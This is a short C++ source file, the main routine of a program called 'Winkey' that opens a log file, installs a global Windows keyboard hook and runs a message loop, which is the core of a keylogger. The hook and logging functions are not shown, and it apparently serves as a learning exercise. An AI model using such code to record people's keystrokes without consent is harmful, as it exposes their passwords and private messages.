#include "winkey.hpp"

HHOOK g_hHook;
std::ofstream g_log_file;

int main() {
    std::cout << ">>> Winkey <<<" << std::endl;
    
    if (!open_log_file() || !install_keyboard_hook()) {
        return 1;
    }

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook before exiting
    UnhookWindowsHookEx(g_hHook);

    // Close the log file
    g_log_file.close();

    return 0;
}
